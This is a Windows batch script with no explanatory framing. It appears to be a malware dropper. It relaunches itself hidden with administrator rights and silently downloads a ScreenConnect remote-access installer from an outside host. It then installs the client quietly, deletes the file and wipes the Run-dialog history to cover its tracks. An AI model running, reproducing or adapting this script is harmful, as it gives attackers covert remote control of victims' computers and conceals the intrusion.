@echo off
if "%~1"=="HIDDEN" goto :INSTALL
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& { Start-Process cmd -ArgumentList '/c','\"%~f0\" HIDDEN' -Verb RunAs -WindowStyle Hidden }"
exit

:INSTALL
set "FILE=%TEMP%\~tmp_%random%.msi"
set "URL=https://panel.thetechpartners.us/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"

:: Pull the MSI
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'} } catch {}"

:: Verify and install
if exist "%FILE%" (
    start "" /wait msiexec /i "%FILE%" /quiet /qn /norestart
    timeout /t 5 /nobreak >nul
)

:: Cleanup
if exist "%FILE%" del "%FILE%" /f /q >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1

exit